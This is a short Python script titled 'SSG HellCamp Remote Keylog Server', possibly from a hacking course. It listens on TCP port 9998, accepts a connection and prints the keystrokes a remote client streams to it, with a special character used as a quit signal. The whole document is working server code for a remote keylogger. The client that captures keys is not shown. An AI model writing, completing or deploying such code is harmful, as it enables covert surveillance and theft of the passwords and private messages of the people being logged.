import socket, sys

host = '0.0.0.0'
port = 9998

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

print("SSG HellCamp Remote Keylog Server")
print("Listening on port " + str(port) + " ... ")
s.bind((host, port))
s.listen(5)

(conn , (ip, port)) = s.accept()
print("Connection from [" + ip + "]" + str(port))

while True:
	client_response = str(conn.recv(4), "utf-8")
	if client_response == '¢':	# CTRL Quit
		print("Ctrl pressed.. Good Bye")
		conn.close()
		s.close()
		sys.exit(-1)
	else:
		print(client_response)

conn.close()
s.close()
